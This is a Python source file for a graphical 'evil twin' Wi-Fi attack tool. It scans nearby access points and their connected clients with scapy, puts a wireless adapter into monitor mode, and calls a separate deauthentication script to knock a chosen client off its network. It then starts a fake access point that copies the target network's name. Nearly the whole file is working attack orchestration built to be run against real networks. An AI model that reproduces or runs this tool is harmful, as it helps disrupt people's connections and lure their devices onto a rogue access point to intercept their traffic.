import PySimpleGUI as sg
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

sg.theme('DarkTeal9')

# global
global ap_interface
global target_mac
global start_scan
global ap
global ap_list
global mac_address_set
global client
global search_timeout
global monitor_interface
global start
global window
global mode_layout
global command
global TImer

# ------ Global variable -----
sniffer_interface = ''
target_mac = ''
ap_list = []
client_list = []
mac_address_set = set()
start = True


# This function change the channel for 14 channel the interface is listening on.
def change_channel():
    global search_timeout
    ch = 1
    now = datetime.now()
    while (now - start_scan).seconds < search_timeout+2:
        now = datetime.now()
        outlinepritner(f"iwconfig {monitor_interface} channel {ch}")
        ch = ch % 14 + 1
        time.sleep(0.3)


# This function get packet check if it Beacon frame , if it is, the function can take
# the Network data, and keep it in ap_list
def scan_networks(pkt):
    global window
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        mac = pkt[Dot11].addr2
        # get the name of it
        network_name = pkt[Dot11Elt].info.decode()
        if mac not in mac_address_set:
            mac_address_set.add(mac)
            # get the channel of the AP
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")

            ap_list.append([network_name, mac, channel])

            # Print in the Gui all Connect AP



# todo gal need to add comments to the function
def only_clients(pkt):
    if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                window['cl'].update(client_list)  # update the Gui with the connected device
                window.refresh()


def scan_clients():
    global target_mac
    global search_timeout
    global start_scan
    global monitor_interface

    channel = ap[0][2]
    mac_addr = ap[0][1]
    target_mac = mac_addr  # ap_mac
    search_timeout = search_timeout * 2
    start_scan = datetime.now()
    outlinepritner(f"iwconfig {monitor_interface} channel {channel}")

    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    try:
        sniff(iface=monitor_interface, prn=only_clients, timeout=search_timeout)
    except Exception as e:
        print('Exception:', e)
    channel_changer.join()


# This function use the wlan Monitor Mode to find all AP in the area using the scan_networks function
def APs_scanner():
    global start_scan
    start_scan = datetime.now()

    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    try:
        sniff(iface=monitor_interface, prn=scan_networks, timeout=search_timeout)
    except UnicodeDecodeError as e:
        print('Exception:', e)
        pass
    channel_changer.join()


# todo gal we have the function twice, here and as a layout check if we need to delete one of them
def death_attack(client_mac: str):
    print(monitor_interface, target_mac, client_mac)
    line = f"python3 death_attack.py {monitor_interface} {target_mac} {client_mac}"
    gnome = f'gnome-terminal -- sh -c "{line}"'
    outlinepritner(gnome)


# set one interface(Wlan) to be Monitor Mode
def device_choose_step1():
    global monitor_interface
    outlinepritner('service NetworkManager stop')
    outlinepritner('airmon-ng check kill')
    outlinepritner('ifconfig ' + monitor_interface + ' down')
    outlinepritner('iwconfig ' + monitor_interface + ' mode monitor')
    outlinepritner('ifconfig ' + monitor_interface + ' up')


interfaces = ['wlan0', 'wlan1']


# layout 2 adapters choose for the attack
def layout_choose_adapters():
    global layout
    layout = [[sg.Text('Choose adapters')],
              [sg.Text('Please type the interface name you want to put in Monitor Mode')],
              [sg.Listbox(interfaces, size=(10, len(interfaces)), enable_events=True, key='_monitor_interface_')],
              [sg.Text('Please type the interface name you want to use for create ap_fake')],
              [sg.Listbox(interfaces, size=(20, len(interfaces)), key='_ap_interface_')],
              [sg.Text('command run')],
              [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                       background_color='white')],
              [sg.Button('select adapters'), sg.Button('Cancel')]]
    return layout


# layout 3 choose time for scan for Ap and choose AP from ap list
def layout_choose_from_ap_list():
    layout_choose_time = [[sg.Text('choose how much time to scan')],
                          [sg.Slider(range=(1, 30), default_value=5, size=(20, 15), key='_Time_to_scan_',
                                     orientation='horizontal', font=('Helvetica', 12))],
                          [sg.Button('next'), sg.Button('Cancel')]]
    window2 = sg.Window('Choose ap').Layout(layout_choose_time)
    event2, values2 = window2.read()

    if values2['_Time_to_scan_']:
        global search_timeout
        global mode_layout

        search_timeout = int(values2['_Time_to_scan_'])
        window2.close()
        mode_layout = "AP"
        col = [[sg.Text('Select from ap_list')],
               [sg.Text('find all Access Points')],
               [sg.Text('*************** APs Table ***************')],
               [sg.Listbox(ap_list, size=(40, 10), enable_events=True, key='_ap_')]]

        col2 = [
            [sg.ProgressBar((search_timeout*10), orientation='v', size=(20, 20), key='progressbar')],
            [sg.Text(size=(10, 2), font=('Helvetica', 20), justification='center', key='text')]]
        layout = [[sg.Column(col), sg.Column(col2)],
                  [sg.Text('command run')],
                  [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                           background_color='white')],
                  [sg.Button('select Ap'), sg.Button('Cancel'), sg.Button('rescan')]]
        return layout


# This function will present in the Gui all the connected devices to to AP
# you can choose the device to attack
def layout_choose_from_client_list():
    global mode_layout
    mode_layout = "client"

    col = [[sg.Text('Select from client_list')],
           [sg.Text('find all Access Points')],
           [sg.Text('*************** client list***************')],
           [sg.Text('Choose the client you want to attack ')],

           [sg.Listbox(client_list, size=(40, 10), enable_events=True, key='cl')]]

    col2 = [
        [sg.ProgressBar((search_timeout * 10), orientation='v', size=(20, 20), key='progressbar')],
        [sg.Text(size=(10, 2), font=('Helvetica', 20), justification='center', key='text')]]
    layout = [[sg.Column(col), sg.Column(col2)],
              [sg.Text('command run')],
              [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                       background_color='white')],
              [sg.Button('select client'), sg.Button('Cancel'), sg.Button('rescan')]]

    return layout


def outlinepritner(str):
    global window
    global command

    os.system(str)
    command=str
    if mode_layout == "start":
        time.sleep(0.2)
        window['_printer_'].update(str)
        window.refresh()

def thread_side(fun):
    ap_thread = Thread(target=fun)  # run a script to find all connected adapters
    ap_thread.daemon = True
    ap_thread.start()


def fake_ap():
    global ap_interface
    global ap
    network_name = ap[0][0]
    os.system("python3 Create_fake_AP.py " + ap_interface + " " + network_name)


def attack():
    global monitor_interface
    global target_mac
    global client
    client_mac = client[0][0]
    line = f"python3 death_attack.py {monitor_interface} {target_mac} {client_mac}"
    time.sleep(1)
    os.system(line)


def main():
    global monitor_interface
    global ap_interface
    global window
    global search_timeout
    global mode_layout
    mode_layout="start"
    # Interface Welcome - Welcome Gui
    layout_Start = [[sg.Text('Welcome to evil-twin attack')],
                   [sg.Image('Evil-Twin-Attack.png')],
                    [sg.Button('start Evil-Twin'), sg.Button('Cancel')]]
    window = sg.Window('Evil-Twin', layout_Start, size=(550, 610), element_justification='c')

    timerisrunnig=False

    while True:
        event, values = window.read(timeout=10)
        # Interface choose adapters - Choose the wlan for monitor mode and for the fake AP
        if event == 'start Evil-Twin':
            window.close()
            window = sg.Window('evil-twin attack', size=(550, 300), element_justification='c'). \
                Layout(layout_choose_adapters())

        if event == 'select adapters':
            if values['_ap_interface_'] and values['_monitor_interface_']:
                if values['_ap_interface_'][0] != values['_monitor_interface_'][0]:
                    ap_interface = values['_ap_interface_'][0]

                    monitor_interface = values['_monitor_interface_'][0]
                    device_choose_step1()  # make the wlan a Monitor Mode
                    time.sleep(1)
                    window.close()
                    window = sg.Window('evil-twin attack', layout_choose_from_ap_list(), finalize=True)
                    thread_side(APs_scanner)
                    timerisrunnig=True

                else:
                    sg.popup_error('please choose different interface ')
            else:
                sg.popup_error('please choose interface ')
        # Interface choose device - Choose the connected device to attack
        if event == 'select Ap' and values['_ap_']:
            global ap
            ap = values['_ap_']
            window.close()
            timerisrunnig = True

            thread_side(scan_clients) # find all connected devices to the selected AP
            window = sg.Window('evil-twin attack', layout_choose_from_client_list(), finalize=True)

        if event == 'rescan':
            if mode_layout == "AP":
                timerisrunnig =True
                thread_side(APs_scanner)
            if mode_layout == "client":
                timerisrunnig =True
                thread_side(scan_clients)




        if timerisrunnig:
            time.sleep(0.2)
            progress_bar = window['progressbar']
            # loop that would normally do something useful
            for i in range(search_timeout*10):
                event, values = window.read(timeout=10)
                time.sleep(0.1)
                if mode_layout == "AP":
                    window['_ap_'].update(ap_list)
                else:
                    window['cl'].update(client_list)
                window['_printer_'].update(command)
                # update bar with loop value +1 so that bar eventually reaches the maximum
                progress_bar.UpdateBar(i + 1)
                window.refresh()

            timerisrunnig=False


        if event == 'select client' and values['cl']:
            global client
            client = values['cl']

            window.close()
            attack()
            fake_ap()


        if event == sg.WIN_CLOSED or event == 'Cancel':  # if user closes window or clicks cancel
            break

    window.close()


if __name__ == '__main__':
    main()